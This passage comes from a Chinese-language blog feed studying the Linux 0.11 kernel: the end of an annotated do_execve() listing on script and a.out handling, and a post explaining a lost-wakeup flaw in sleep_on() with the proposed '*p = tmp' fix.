exec_error2;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 程序执行到这里，说明当前进程有运行指定执行文件的权限。因此从这里开始我们</span></span><br><span class="line">    <span class="comment">// 需要取出执行文件头部数据并根据其中的信息来分析设置运行环境，或者运行另一</span></span><br><span class="line">    <span class="comment">// 个shell程序来执行脚本程序。首先读取执行文件第1块数据到高速缓冲块中。并复</span></span><br><span class="line">    <span class="comment">// 制缓冲块数据到ex中。如果执行文件开始的两个字节是字符&#x27;#!&#x27;，则说明执行文件</span></span><br><span class="line">    <span class="comment">// 是一个脚本文件。如果想运行脚本文件，我们就需要执行脚本文件的解释程序(例</span></span><br><span class="line">    <span class="comment">// 如shell程序)。通常脚本文件的第一行文本为&#x27;#!/bin/bash&#x27;。他指明了运行脚本</span></span><br><span class="line">    <span class="comment">// 文件需要的解释程序。运行方法从脚本文件第一行中取出其中的解释程序名及后面</span></span><br><span class="line">    <span class="comment">// 的参数(若有的话)，然后将这些参数和脚本文件名放进执行文件（此时是解释程序）</span></span><br><span class="line">    <span class="comment">// 的命令行参数空间中。在这之前我们当然需要先把函数指定的原有命令行参数和环</span></span><br><span class="line">    <span class="comment">// 境字符串放到128KB空间中，而这里建立起来的命令行参数则放到它们前面位置处(</span></span><br><span class="line">    <span class="comment">// 因为是逆向放置)。最后让内核执行脚本文件的解释程序。下面就是在设置好解释</span></span><br><span class="line">    <span class="comment">// 程序的脚本文件名等参数后，取出解释程序的i节点并跳转去执行解释程序。由于</span></span><br><span class="line">    <span class="comment">// 我们需要跳转去执行，因此在下面确认处并处理了脚本文件之后需要设置一个禁止</span></span><br><span class="line">    <span class="comment">// 再次执行下面的脚本处理代码标志sh_bang。在后面的代码中该标志也用来表示我</span></span><br><span class="line">    <span class="comment">// 们已经设置好执行的命令行参数，不用重复设置。</span></span><br><span class="line">	<span class="keyword">if</span> (!(bh = bread(inode-&gt;i_dev,inode-&gt;i_zone[<span class="number">0</span>]))) &#123;</span><br><span class="line">		retval = -EACCES;</span><br><span class="line">		<span class="keyword">goto</span> exec_error2;</span><br><span class="line">	&#125;</span><br><span class="line">	ex = *((struct exec *) bh-&gt;b_data);	<span class="comment">/* read exec-header */</span></span><br><span class="line">	<span class="keyword">if</span> ((bh-&gt;b_data[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span>) &amp;&amp; (bh-&gt;b_data[<span class="number">1</span>] == <span class="string">&#x27;!&#x27;</span>) &amp;&amp; (!sh_bang)) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * This section does the #! interpretation.</span></span><br><span class="line"><span class="comment">		 * Sorta complicated, but hopefully it will work.  -TYT</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">char</span> buf[<span class="number">1023</span>], *cp, *interp, *i_name, *i_arg;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> old_fs;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从这里开始，我们从脚本文件中提取解释程序名以及其参数，并把解释程序名、</span></span><br><span class="line">        <span class="comment">// 解释程序的参数和脚本文件名组合放入环境参数块中。首先复制脚本文件头1</span></span><br><span class="line">        <span class="comment">// 行字符&#x27;#!&#x27;后面的字符串到buf中，其中含有脚本解释程序名，也可能包含解</span></span><br><span class="line">        <span class="comment">// 释程序的几个参数。然后对buf中的内容进行处理。删除开始空格、制表符。</span></span><br><span class="line">		<span class="built_in">strncpy</span>(buf, bh-&gt;b_data+<span class="number">2</span>, <span class="number">1022</span>);</span><br><span class="line">		brelse(bh);</span><br><span class="line">		iput(inode);</span><br><span class="line">		buf[<span class="number">1022</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span> ((cp = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\n&#x27;</span>))) &#123;</span><br><span class="line">			*cp = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">			<span class="keyword">for</span> (cp = buf; (*cp == <span class="string">&#x27; &#x27;</span>) || (*cp == <span class="string">&#x27;\t&#x27;</span>); cp++);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!cp || *cp == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">			retval = -ENOEXEC; <span class="comment">/* No interpreter name found */</span></span><br><span class="line">			<span class="keyword">goto</span> exec_error1;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">// 此时我们得到了开头是脚本解释程序名的一行内容(字符串)。下面分析改行。</span></span><br><span class="line">        <span class="comment">// 首先取第一个字符串，它应该是解释程序名，此时i_name指向该名称。若解释</span></span><br><span class="line">        <span class="comment">// 程序名后还有字符，则它们应该是解释程序的参数串，于是令i_arg指向该串。</span></span><br><span class="line">		interp = i_name = cp;</span><br><span class="line">		i_arg = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> ( ; *cp &amp;&amp; (*cp != <span class="string">&#x27; &#x27;</span>) &amp;&amp; (*cp != <span class="string">&#x27;\t&#x27;</span>); cp++) &#123;</span><br><span class="line"> 			<span class="keyword">if</span> (*cp == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">				i_name = cp+<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (*cp) &#123;</span><br><span class="line">			*cp++ = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">			i_arg = cp;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * OK, we&#x27;ve parsed out the interpreter name and</span></span><br><span class="line"><span class="comment">		 * (optional) argument.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">        <span class="comment">// 现在我们要把上面解析出来的解释程序名i_name及其参数i_arg和脚本文件名作</span></span><br><span class="line">        <span class="comment">// 即使程序的参数放进环境和参数块中。不过首先我们需要把函数提供的原来一</span></span><br><span class="line">        <span class="comment">// 些参数和环境字符串先放进去，然后再放这里解析出来的。例如对于命令行参</span></span><br><span class="line">        <span class="comment">// 数来说，如果原来的参数是&quot;-arg1-arg2&quot;、解释程序名是bash、其参数是&quot;-iarg1</span></span><br><span class="line">        <span class="comment">//  -iarg2&quot;、脚本文件名(即原来的执行文件名)是&quot;example.sh&quot;，那么放入这里</span></span><br><span class="line">        <span class="comment">//  的参数之后，新的命令行类似于这样：</span></span><br><span class="line">        <span class="comment">//  &quot;bash -iarg1 -iarg2 example.sh -arg1 -arg2&quot;</span></span><br><span class="line">        <span class="comment">//  这里我们把sh_bang标志置上，然后把函数参数提供的原有参数和环境字符串</span></span><br><span class="line">        <span class="comment">//  放入到空间中。环境字符串和参数个数分别是envc和argc-1个。少复制的一</span></span><br><span class="line">        <span class="comment">//  个原有参数是原来的执行文件名，即这里的脚本文件名。[[??? 这里可以看</span></span><br><span class="line">        <span class="comment">//  出，实际上我们需要去另行处理脚本文件名，即这里完全可以复制argc个参</span></span><br><span class="line">        <span class="comment">//  数，包括原来执行文件名(即现在的脚本文件名)。因为它位于同一个位置上]]</span></span><br><span class="line">        <span class="comment">//  注意！这里指针p随着复制信息增加而逐渐向小地址方向移动，因此这两个复</span></span><br><span class="line">        <span class="comment">//  制串函数执行完后，环境参数串信息块位于程序命令行参数串信息块的上方，</span></span><br><span class="line">        <span class="comment">//  并且p指向程序的第一个参数串。copy_strings()最后一个参数(0)指明参数</span></span><br><span class="line">        <span class="comment">//  字符串在用户空间。</span></span><br><span class="line">		<span class="keyword">if</span> (sh_bang++ == <span class="number">0</span>) &#123;</span><br><span class="line">			p = copy_strings(envc, envp, page, p, <span class="number">0</span>);</span><br><span class="line">			p = copy_strings(--argc, argv+<span class="number">1</span>, page, p, <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Splice in (1) the interpreter&#x27;s name for argv[0]</span></span><br><span class="line"><span class="comment">		 *           (2) (optional) argument to interpreter</span></span><br><span class="line"><span class="comment">		 *           (3) filename of shell script</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * This is done in reverse order, because of how the</span></span><br><span class="line"><span class="comment">		 * user environment and arguments are stored.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">        <span class="comment">// 接着我们逆向复制脚本文件名、解释程序的参数和解释程序文件名到参数和环</span></span><br><span class="line">        <span class="comment">// 境空间中。若出错，则置出错码，跳转到exec_error1。另外，由于本函数参</span></span><br><span class="line">        <span class="comment">// 数提供的脚本文件名filename在用户空间，而这里赋予copy_string()的脚本</span></span><br><span class="line">        <span class="comment">// 文件名指针在内核空间，因此这个复制字符串函数的最后一个参数(字符串来</span></span><br><span class="line">        <span class="comment">// 源标志)需要被设置成1.若字符串在内核空间，则copy_strings()的最后一个</span></span><br><span class="line">        <span class="comment">// 参数要设置成2。</span></span><br><span class="line">		p = copy_strings(<span class="number">1</span>, &amp;filename, page, p, <span class="number">1</span>);</span><br><span class="line">		argc++;</span><br><span class="line">		<span class="keyword">if</span> (i_arg) &#123;</span><br><span class="line">			p = copy_strings(<span class="number">1</span>, &amp;i_arg, page, p, <span class="number">2</span>);</span><br><span class="line">			argc++;</span><br><span class="line">		&#125;</span><br><span class="line">		p = copy_strings(<span class="number">1</span>, &amp;i_name, page, p, <span class="number">2</span>);</span><br><span class="line">		argc++;</span><br><span class="line">		<span class="keyword">if</span> (!p) &#123;</span><br><span class="line">			retval = -ENOMEM;</span><br><span class="line">			<span class="keyword">goto</span> exec_error1;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * OK, now restart the process with the interpreter&#x27;s inode.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">        <span class="comment">// 最后我们取得解释程序的i节点指针，然后跳转到上面去执行解释程序。为了</span></span><br><span class="line">        <span class="comment">// 获得解释程序的i节点，我们需要使用namei()函数，但是该函数所使用的参数</span></span><br><span class="line">        <span class="comment">// (文件名)是从用户数据空间得到的，即从段寄存器fs指向空间中取得。因此调</span></span><br><span class="line">        <span class="comment">// 用namei()函数之前我们需要先临时让fs指向内核数据空间，以让函数能从内</span></span><br><span class="line">        <span class="comment">// 核空间得到解释程序名，并在namei()返回后恢复fs的默认设置。因此这里我</span></span><br><span class="line">        <span class="comment">// 们先临时保存原fs段寄存器（原指向用户数据段）的值，将其设置成指向内核</span></span><br><span class="line">        <span class="comment">// 数据段，然后取解释程序的i节点。之后再恢复fs的原值。并跳转到restart_interp</span></span><br><span class="line">        <span class="comment">// 出重新处理新的执行文件——脚本文件解释程序。</span></span><br><span class="line">		old_fs = get_fs();</span><br><span class="line">		set_fs(get_ds());</span><br><span class="line">		<span class="keyword">if</span> (!(inode=namei(interp))) &#123; <span class="comment">/* get executables inode */</span></span><br><span class="line">			set_fs(old_fs);</span><br><span class="line">			retval = -ENOENT;</span><br><span class="line">			<span class="keyword">goto</span> exec_error1;</span><br><span class="line">		&#125;</span><br><span class="line">		set_fs(old_fs);</span><br><span class="line">		<span class="keyword">goto</span> restart_interp;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 此时缓冲块中的执行文件头结构数据已经复制到了ex中。于是先释放该缓冲块，并</span></span><br><span class="line">    <span class="comment">// 开始对ex中的执行头信息进行判断处理。对于Linux0.11内核来说，它仅支持ZMAGIC</span></span><br><span class="line">    <span class="comment">// 执行文件格式，并且执行文件代码都从逻辑地址0开始执行，因此不支持含有代码</span></span><br><span class="line">    <span class="comment">// 或数据重定位信息的执行文件。当然，如果执行文件实在太大或者执行文件残缺不</span></span><br><span class="line">    <span class="comment">// 全，那么我们也不能运行它。因此对于下列情况将不执行程序：如果执行文件不是</span></span><br><span class="line">    <span class="comment">// 需求页可执行文件（ZMAGIC）、或者代码和数据重定位部分不等于0，或者（代码段</span></span><br><span class="line">    <span class="comment">// + 数据段+堆）长度超过50MB、或者执行文件长度小于（代码段+数据段+符号表长度</span></span><br><span class="line">    <span class="comment">// +执行头部分）长度的总和。</span></span><br><span class="line">	brelse(bh);</span><br><span class="line">	<span class="keyword">if</span> (N_MAGIC(ex) != ZMAGIC || ex.a_trsize || ex.a_drsize ||</span><br><span class="line">		ex.a_text+ex.a_data+ex.a_bss&gt;<span class="number">0x3000000</span> ||</span><br><span class="line">		inode-&gt;i_size &lt; ex.a_text+ex.a_data+ex.a_syms+N_TXTOFF(ex)) &#123;</span><br><span class="line">		retval = -ENOEXEC;</span><br><span class="line">		<span class="keyword">goto</span> exec_error2;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 另外，如果执行文件中代码开始处没有位于1个页面(1024字节)边界处，则也不能</span></span><br><span class="line">    <span class="comment">// 执行。因为需求页(Demand paging)技术要求加载执行文件内容时以页面为单位，</span></span><br><span class="line">    <span class="comment">// 因此要求执行文件映象中代码和数据都从页面边界处开始。</span></span><br><span class="line">	<span class="keyword">if</span> (N_TXTOFF(ex) != BLOCK_SIZE) &#123;</span><br><span class="line">		printk(<span class="string">&quot;%s: N_TXTOFF != BLOCK_SIZE. See a.out.h.&quot;</span>, filename);</span><br><span class="line">		retval = -ENOEXEC;</span><br><span class="line">		<span class="keyword">goto</span> exec_error2;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 如果sh_bang标志没有设置，则复制指定个数的命令行参数和环境字符串到参数和</span></span><br><span class="line">    <span class="comment">// 环境空间中。若sh_bang标志已经设置，则表明是将运行脚本解释程序，此时环境</span></span><br><span class="line">    <span class="comment">// 变量页面已经复制，无须再复制。同样，若sh_bang没有置位而需要复制的话，那</span></span><br><span class="line">    <span class="comment">// 么此时指针p随着复制信息增加而逐渐向小地址方向移动，因此这两个复制串函数</span></span><br><span class="line">    <span class="comment">// 执行完后，环境参数串信息块位于程序参数串信息块上方，并且p指向程序的第1个</span></span><br><span class="line">    <span class="comment">// 参数串。事实上，p是128KB参数和环境空间中的偏移值。因此如果p=0，则表示环</span></span><br><span class="line">    <span class="comment">// 境变量与参数空间页面已经被占满，容纳不下了。</span></span><br><span class="line">	<span class="keyword">if</span> (!sh_bang) &#123;</span><br><span class="line">		p = copy_strings(envc,envp,page,p,<span class="number">0</span>);</span><br><span class="line">		p = copy_strings(argc,argv,page,p,<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (!p) &#123;</span><br><span class="line">			retval = -ENOMEM;</span><br><span class="line">			<span class="keyword">goto</span> exec_error2;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">/* OK, This is the point of no return */</span></span><br><span class="line">    <span class="comment">// 前面我们针对函数参数提供的信息对需要运行执行文件的命令行参数和环境空间进</span></span><br><span class="line">    <span class="comment">// 行了设置，但还没有为执行文件做过什么实质性的工作，即还没有做过为执行文件</span></span><br><span class="line">    <span class="comment">// 初始化进程任务结构信息、建立页表等工作。现在我们就来做这些工作。由于执行</span></span><br><span class="line">    <span class="comment">// 文件直接使用当前进程的“躯壳”，即当钱进程将被改造成执行文件的进程，因此我</span></span><br><span class="line">    <span class="comment">// 们需要首先释放当前进程占用的某些系统资源，包括关闭指定的已打开文件、占用</span></span><br><span class="line">    <span class="comment">// 的页表和内存页面等。然后根据执行文件头结构信息修改当前进程使用的局部描述</span></span><br><span class="line">    <span class="comment">// 符表LDT中描述符的内容，重新设置代码段和数据段描述符的限长，再利用前面处</span></span><br><span class="line">    <span class="comment">// 理得到的e_uid和e_gid等信息来设置进程任务结构中相关的字段。最后把执行本次</span></span><br><span class="line">    <span class="comment">// 系统调用程序的返回地址eip[]指向执行文件中代码的其实位置处。这样当本系统</span></span><br><span class="line">    <span class="comment">// 调用退出返回后就会去运行新执行文件的代码了。注意，虽然此时新执行文件代码</span></span><br><span class="line">    <span class="comment">// 和数据还没有从文件中加载到内存中，但其参数和环境块已经在copy_strings()中</span></span><br><span class="line">    <span class="comment">// 使用get_free_page()分配了物理内存页来保存数据，并在change_ldt()函数中使</span></span><br><span class="line">    <span class="comment">// 用put_page()放到了进程逻辑空间的末端处。另外，在create_tables()中也会由</span></span><br><span class="line">    <span class="comment">// 于在用户栈上存放参数和环境指针表而引起缺页异常，从而内存管理程序也会就此</span></span><br><span class="line">    <span class="comment">// 为用户栈空间映射物理内存页。</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 这里我们首先放回进程原执行程序的i节点，并且让进程executable字段指向新执行</span></span><br><span class="line">    <span class="comment">// 文件的i节点。然后复位原进程的所有信号处理句柄。再根据设定的执行时关闭文件</span></span><br><span class="line">    <span class="comment">// 句柄（close_on_exec）位图标志，关闭指定的打开文件，并复位该标志。</span></span><br><span class="line">	<span class="keyword">if</span> (current-&gt;executable)</span><br><span class="line">		iput(current-&gt;executable);</span><br><span class="line">	current-&gt;executable = inode;</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;<span class="number">32</span> ; i++)</span><br><span class="line">		current-&gt;sigaction[i].sa_handler = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;NR_OPEN ; i++)</span><br><span class="line">		<span class="keyword">if</span> ((current-&gt;close_on_exec&gt;&gt;i)&amp;<span class="number">1</span>)</span><br><span class="line">			sys_close(i);</span><br><span class="line">	current-&gt;close_on_exec = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 然后根据当前进程指定的基地址和限长，释放原来程序的代码段和数据段所对应的</span></span><br><span class="line">    <span class="comment">// 内存页表指定的物理内存页面及页表本身。此时新执行文件并没有占用主内存区任</span></span><br><span class="line">    <span class="comment">// 何页面，因此在处理器真正运行新执行文件代码时就会引起缺页异常中断，此时内</span></span><br><span class="line">    <span class="comment">// 存管理程序执行缺页处理而为新执行文件申请内存页面和设置相关表项，并且把相</span></span><br><span class="line">    <span class="comment">// 关执行文件页面读入内存中。如果“上次任务使用了协处理器”指向的是当前进程，</span></span><br><span class="line">    <span class="comment">// 则将其置空，并复位使用了协处理器的标志。</span></span><br><span class="line">	free_page_tables(get_base(current-&gt;ldt[<span class="number">1</span>]),get_limit(<span class="number">0x0f</span>));</span><br><span class="line">	free_page_tables(get_base(current-&gt;ldt[<span class="number">2</span>]),get_limit(<span class="number">0x17</span>));</span><br><span class="line">	<span class="keyword">if</span> (last_task_used_math == current)</span><br><span class="line">		last_task_used_math = <span class="literal">NULL</span>;</span><br><span class="line">	current-&gt;used_math = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 然后我们根据新执行文件头结构中的代码长度字段a_text的值修改局部表中描述符</span></span><br><span class="line">    <span class="comment">// 基地址和段限长，并将128KB的参数和环境空间页面放置在数据段末端。执行下面</span></span><br><span class="line">    <span class="comment">// 语句之后，p此时更改成以数据段起始处为原点的偏移值，但仍指向参数和环境空</span></span><br><span class="line">    <span class="comment">// 间数据开始处，即已转换成为栈指针值。然后调用内部函数create_tables()在栈中</span></span><br><span class="line">    <span class="comment">// 穿件环境和参数变量指针表，供程序的main()作为参数使用，并返回该栈指针。</span></span><br><span class="line">	p += change_ldt(ex.a_text,page)-MAX_ARG_PAGES*PAGE_SIZE;</span><br><span class="line">	p = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) create_tables((<span class="keyword">char</span> *)p,argc,envc);</span><br><span class="line">    <span class="comment">// 接着再修改各字段值为新执行文件的信息。即令进程任务结构代码尾字段end_code</span></span><br><span class="line">    <span class="comment">// 等于执行文件的代码长度a_text；数据尾字段end_data等于执行文件的代码段长度</span></span><br><span class="line">    <span class="comment">// 加数据段长度(a_data+a_text)；并令进程堆结尾字段brk=a_text+a_data+a_bss.</span></span><br><span class="line">    <span class="comment">// brk用于指明进程当前数据段（包括未初始化数据部分）末端位置。然后设置进程</span></span><br><span class="line">    <span class="comment">// 栈开始字段为栈指针所在页面，并重新设置进程的有效用户id和有效组id。</span></span><br><span class="line">	current-&gt;brk = ex.a_bss +</span><br><span class="line">		(current-&gt;end_data = ex.a_data +</span><br><span class="line">		(current-&gt;end_code = ex.a_text));</span><br><span class="line">	current-&gt;start_stack = p &amp; <span class="number">0xfffff000</span>;</span><br><span class="line">	current-&gt;euid = e_uid;</span><br><span class="line">	current-&gt;egid = e_gid;</span><br><span class="line">    <span class="comment">// 如果执行文件代码加数据长度的末端不再页面边界上，则把最后不到1页长度的内</span></span><br><span class="line">    <span class="comment">// 存过空间初始化为零。</span></span><br><span class="line">	i = ex.a_text+ex.a_data;</span><br><span class="line">	<span class="keyword">while</span> (i&amp;<span class="number">0xfff</span>)</span><br><span class="line">		put_fs_byte(<span class="number">0</span>,(<span class="keyword">char</span> *) (i++));</span><br><span class="line">    <span class="comment">// 最后将原调用系统中断的程序在堆栈上的代码指针替换为指向新执行程序的入口点，</span></span><br><span class="line">    <span class="comment">// 并将栈指针替换为执行文件的栈指针。此后返回指令将这些栈数据并使得CPU去执</span></span><br><span class="line">    <span class="comment">// 行新执行文件，因此不会返回到原调用系统中断的程序中去了。</span></span><br><span class="line">	eip[<span class="number">0</span>] = ex.a_entry;		<span class="comment">/* eip, magic happens :-) */</span></span><br><span class="line">	eip[<span class="number">3</span>] = p;			<span class="comment">/* stack pointer */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">exec_error2:</span><br><span class="line">	iput(inode);</span><br><span class="line">exec_error1:</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;MAX_ARG_PAGES ; i++)</span><br><span class="line">		free_page(page[i]);</span><br><span class="line">	<span class="keyword">return</span>(retval);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>相对于Windows的PE格式来说该版本的可执行文件格式(a.out)还是简单许多，所以需要配套的编译链接工具提供支持，有时间可以继续分析ELF。可以同步参考<a href="https://tinylab.gitbooks.io/cbook/content/zh/preface/01-chapter1.html">这里</a>。</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Linux kernel</tag>
        <tag>LDD</tag>
        <tag>Asm</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核0.11完全注释 关于任务睡眠和唤醒的理解</title>
    <url>/embpgp.github.io/2016/12/23/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E5%85%B3%E4%BA%8E%E4%BB%BB%E5%8A%A1%E7%9D%A1%E7%9C%A0%E5%92%8C%E5%94%A4%E9%86%92%E7%9A%84%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<blockquote>
<p>主要理解注释中提到的链表以及缺少几行代码的缘由</p>
</blockquote>
<span id="more"></span>

<hr>
<h1 id="何为任务调度"><a href="#何为任务调度" class="headerlink" title="何为任务调度?"></a>何为任务调度?</h1><p>学过操作系统的筒子们应该有很深刻的理论了，其实说白了就是从现有可运行的任务中选一个最紧急(或者优先级最高)的任务运行，关于如何定义”最紧急”(优先级最高或者说实时进程)才是调度算法去解决的问题，这里先不分析，Linux 0.11内核调度算法也不是很难。</p>
<h1 id="sleep-on-函数"><a href="#sleep-on-函数" class="headerlink" title="sleep_on()函数"></a>sleep_on()函数</h1><p>没有源代码的可以参阅<a href="https://github.com/embpgp/linux-0.11-lab/blob/master/kernel/sched.c#L151">这里</a>。这里的代码已经有修复了。Linus原来的代码如下:(中文注释乃赵博士所写~)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 把当前任务置为不可中断的等待状态，并让睡眠队列指针指向当前任务。</span></span><br><span class="line"><span class="comment">// 只有明确的唤醒时才会返回。该函数提供了进程与中断处理程序之间的同步机制。函数参数P是等待</span></span><br><span class="line"><span class="comment">// 任务队列头指针。指针是含有一个变量地址的变量。这里参数p使用了指针的指针形式&#x27;**p&#x27;,这是因为</span></span><br><span class="line"><span class="comment">// C函数参数只能传值，没有直接的方式让被调用函数改变调用该函数程序中变量的值。但是指针&#x27;*p&#x27;</span></span><br><span class="line"><span class="comment">// 指向的目标(这里是任务结构)会改变，因此为了能修改调用该函数程序中原来就是指针的变量的值，</span></span><br><span class="line"><span class="comment">// 就需要传递指针&#x27;*p&#x27;的指针，即&#x27;**p&#x27;.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sleep_on</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若指针无效，则退出。(指针所指向的对象可以是NULL，但指针本身不应该为0).另外，如果</span></span><br><span class="line">    <span class="comment">// 当前任务是任务0，则死机。因为任务0的运行不依赖自己的状态，所以内核代码把任务0置为</span></span><br><span class="line">    <span class="comment">// 睡眠状态毫无意义。</span></span><br><span class="line">	<span class="keyword">if</span> (!p)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span> (current == &amp;(init_task.task))</span><br><span class="line">		panic(<span class="string">&quot;task[0] trying to sleep&quot;</span>);</span><br><span class="line">    <span class="comment">// 让tmp指向已经在等待队列上的任务(如果有的话)，例如inode-&gt;i_wait.并且将睡眠队列头的</span></span><br><span class="line">    <span class="comment">// 等等指针指向当前任务。这样就把当前任务插入到了*p的等待队列中。然后将当前任务置为</span></span><br><span class="line">    <span class="comment">// 不可中断的等待状态，并执行重新调度。</span></span><br><span class="line">	tmp = *p;</span><br><span class="line">	*p = current;</span><br><span class="line">	current-&gt;state = TASK_UNINTERRUPTIBLE;</span><br><span class="line">	schedule();</span><br><span class="line">    <span class="comment">// 只有当这个等待任务被唤醒时，调度程序才又返回到这里，表示本进程已被明确的唤醒(就</span></span><br><span class="line">    <span class="comment">// 续态)。既然大家都在等待同样的资源，那么在资源可用时，就有必要唤醒所有等待该该资源</span></span><br><span class="line">    <span class="comment">// 的进程。该函数嵌套调用，也会嵌套唤醒所有等待该资源的进程。这里嵌套调用是指一个</span></span><br><span class="line">    <span class="comment">// 进程调用了sleep_on()后就会在该函数中被切换掉，控制权呗转移到其他进程中。此时若有</span></span><br><span class="line">    <span class="comment">// 进程也需要使用同一资源，那么也会使用同一个等待队列头指针作为参数调用sleep_on()函数，</span></span><br><span class="line">    <span class="comment">// 并且也会陷入该函数而不会返回。只有当内核某处代码以队列头指针作为参数wake_up了队列，</span></span><br><span class="line">    <span class="comment">// 那么当系统切换去执行头指针所指的进程A时，该进程才会继续执行下面的代码，把队列后一个</span></span><br><span class="line">    <span class="comment">// 进程B置位就绪状态(唤醒)。而当轮到B进程执行时，它也才可能继续执行下面的代码。若它</span></span><br><span class="line">    <span class="comment">// 后面还有等待的进程C，那它也会把C唤醒等。在这前面还应该添加一行：*p = tmp.</span></span><br><span class="line">	<span class="keyword">if</span> (tmp)                    <span class="comment">// 若在其前还有存在的等待的任务，则也将其置为就绪状态(唤醒).</span></span><br><span class="line">		tmp-&gt;state=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>调用此函数的地方一般是资源得不到满足(比如等待缓冲区解锁等场景)而致使自身任务运行到这里时候睡眠。但是等待这个资源的可能不止一个进程，一般管理缓冲的数据结构都会设置一个task_struct结构体指针表示当前正在等待本缓冲区的任务。但数据结构中并没有明显定义链表结构呀?注释里怎么说有呢?其实是”潜移默化”地保存在了各个任务的栈空间中去了。<br><img src="/images/Linux_0.11_schedule_sleep_on.png" alt="Linux_0.11_schedule_sleep_on.png"><br>内核代码首先定义一个tmp指针保存已经正在等待本资源的进程(假设叫A),然后将正在等待本资源的进程改变为当前进程(假设叫B)，并立即置B进程状态为不可中断地好唤醒，表示只能由wake_up函数来唤醒。之后便进行任务调度，因此B进程会”停止”在任务调度这里,因为如果没有被唤醒(即state置0)是不可能被调度的，调度算法只会选出”状态为0”的进程进行调度运行。假设另外一个进程(假设为C)也需要这个资源，代码也运行到这里(但是它们的进程上下文是不同的)，在C进程的栈空间定义一个tmp保存B进程的指针，把C自己的指针赋值到资源等待任务的指针位置，并启用任务调度，同样，C也会”停止”在这里。假设某个时候某个进程手动调用了wake_up函数。此时传递的指针居然是C进程(假设之后没有其他进程需要这个资源了)。好了，C被唤醒了，肯定优先于A和B运行了，貌似不太公平呀，”后来先到”。当调度程序检测到C处于可运行状态的时候并且它的优先级最高，便切换到C运行，而C会从schedule()函数这里继续向后运行，Linus原来的代码仅仅是将tmp任务(这里是B)唤醒，如果在这次之后没有其他任务来竞争这个资源，则也能顺利陆续唤醒(因为B运行完了也会执行到这里，B的tmp保存了A的任务指针…)。但是如果此时有一个任务D也来等待这个资源，D运行到tmp的时候tmp保存的居然还是C的任务指针(因为等待资源任务指针没有被更新)。之后运行完之后继续唤醒C(没啥用，C早就可运行，或者等待其他资源而阻塞，此时唤醒它将会打乱其所在队列…当然一般会有其他策略继续检测)。但是A和B不出意外就永远不能唤醒了。因此赵博士的注释要求增加一行代码<code>*p=tmp</code>，目的是刷新等待缓冲任务指针。(按照栈的意思也得有借有还吧，前面保存了之后也得会送回去呀)至于为什么Linux 0.11版本内核也看出什么大问题可能是由于”竞争”不够激烈，等待真正遇到业务场景复杂的时候弊端就暴露出来了，因此Linux内核版本一直在前进中。</p>
<p><img src="/images/Linux_0.11_schedule_list_table.png" alt="Linux_0.11_schedule_list_table.png"></p>
